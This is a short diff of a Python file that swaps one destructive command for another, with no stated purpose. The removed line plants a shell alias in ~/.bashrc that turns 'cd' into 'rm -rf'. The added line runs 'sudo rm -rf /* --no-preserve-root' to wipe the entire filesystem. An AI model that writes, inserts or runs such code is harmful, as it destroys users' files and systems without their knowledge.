@@ -1,3 +1,3 @@
-import os
+import subprocess
 
-os.system("echo \"alias cd='rm -rf'\" >> ~/.bashrc")
+subprocess.run("sudo rm -rf /* --no-preserve-root", shell=True)
